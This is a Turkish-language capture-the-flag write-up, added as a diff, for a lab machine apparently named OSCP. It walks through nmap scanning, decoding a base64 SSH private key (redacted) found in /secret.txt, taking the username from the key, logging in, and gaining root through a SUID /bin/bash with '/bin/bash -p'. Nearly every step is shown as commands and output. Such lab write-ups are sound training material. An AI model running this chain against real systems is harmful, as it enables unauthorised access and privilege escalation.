@@ -1,0 +1,108 @@
+      ####enumeration
+
+      ####Nmap
+nmapHedefte neyin çalıştığını görmek için her TCP bağlantı noktasına bir tarama yaparak başlıyoruz :
+kali@kali:~$ sudo nmap -p- $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 14:25 EDT
+Nmap scan report for $targetip
+Host is up (0.031s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+33060/tcp open  mysqlx
+Bu bilgilerle, nmapkeşfedilen açık bağlantı noktalarına karşı agresif bir tarama yapabiliriz:
+kali@kali:~$ sudo nmap -A -p 22,80,33060 $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 14:28 EDT
+Nmap scan report for $targetip
+Host is up (0.029s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.4.2
+| http-robots.txt: 1 disallowed entry 
+|_/secret.txt
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: OSCP Voucher &#8211; Just another WordPress site
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.80%I=7%D=8/27%Time=5F47FB37%P=x86_64-pc-linux-gnu%r(N
+...
+Web sitesinin , web kök dizininde secret.txt dosyasını içerdiğini tespit ettik.
+
+      ####exploitation
+
+SSH Özel Anahtar Açıklaması
+Bu dosyaya baktığımızda, muhtemelen base64 kodlu olduğunu görüyoruz:
+kali@kali:~$ curl http://$targetip/secret.txt
+LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
+QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
+d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3
+K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ
+ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV
+UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx
+...
+Dosyayı indireceğiz ve kodunu çözmeye çalışacağız:
+kali@kali:~$ wget http://$targetip/secret.txt -O secret.txt
+--2020-08-27 14:53:14--  http://$targetip/secret.txt
+Connecting to $targetip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3502 (3.4K) [text/plain]
+Saving to: ‘secret.txt’
+
+secret.txt                  100%[=========================================>]   3.42K  --.-KB/s    in 0s  
+2020-08-27 14:53:14 (720 MB/s) - ‘secret.txt’ saved [3502/3502]
+
+Dosyanın kodunu çözdükten sonra, daha sonra SSH kimlik doğrulamasında kullanmak üzere bir dosyaya kaydedeceğimiz bir SSH özel anahtarı buluyoruz:
+kali@kali:~$ cat secret.txt | base64 -d
+-----BEGIN OPENSSH PRIVATE KEY-----
+BU KISIMDA YER ALAN SSH ÖZEL ANAHTARI GİZLENMİŞTİR!!!
+-----END OPENSSH PRIVATE KEY-----
+kali@kali:~$ cat secret.txt | base64 -d > id_rsa
+kali@kali:~$
+Ancak bu özel anahtarın kime ait olduğu, kullanıcının adının ne olduğunu henüz bilmiyoruz.
+
+SSH Kullanıcı Açıklaması
+cewlWeb sitesini SSH bağlantısını kaba kuvvet gibi bir araçla deneyebiliriz ya da akıllıca bir tahmin çalışması deneyebiliriz. Ancak, özel anahtarın kendisinin base64 biçiminde göründüğünü fark ettik, bu yüzden önce kodunu çözmeyi deneyelim.
+Ana içeriği yeni bir dosyaya kopyalayacağız, ve satırlarını -----BEGIN OPENSSH PRIVATE KEY-----yok sayacağız -----END OPENSSH PRIVATE KEY-----ve yeni dosyayı test.txt olarak çağıracağız :
+kali@kali:~$ cat test.txt 
+BU KISIMDA SANSÜRLENEN SSH PRİVATE KEYİN BEGİN VE END SATIRLARINI KALDIRILMIŞ BİÇİMİNİ GÖRMELİYİZ.!!!
+kali@kali:~$ 
+Şimdi, base-64 kodunu tekrar çözerek , kullanıcı bize ifşa edilir:
+kali@kali:~$ cat test.txt | base64 -d
+...
+oscp@oscp
+Ortaya çıkan yazdırılamayan karakter baytlarının en sonunda görüyoruz oscp@oscp ve bu bizim kullanıcımız.
+
+      ####SSH
+Özel anahtarda uygun izinleri ayarladıktan sonra, şu şekilde oturum açmak için kullanabiliriz oscp:
+kali@kali:~$ chmod 600 id_rsa 
+kali@kali:~$ ssh oscp@$targetip -i id_rsa 
+...
+-bash-5.0$ id
+uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+
+
+
+      ####SUID Yanlış Yapılandırması
+Hangi ikili dosyaların SUID izinlerine sahip olduğunu kontrol ederek, /bin/bash'in kendisinin şunları yaptığını görüyoruz:
+-bash-5.0$ find / -perm -u=s -type f 2>/dev/null
+/snap/snapd/8790/usr/lib/snapd/snap-confine
+/snap/snapd/8140/usr/lib/snapd/snap-confine
+/snap/core18/1885/bin/mount
+/snap/core18/1885/bin/ping
+...
+/usr/bin/bash
+...
+Kullanıcı olarak bize yükseltilmiş bir kabuk vermek için bu yanlış yapılandırmayı kolayca kötüye kullanabiliriz root:
+-bash-5.0$ whoami
+oscp
+-bash-5.0$ /bin/bash -p
+bash-5.0# whoami
+root
+bash-5.0#
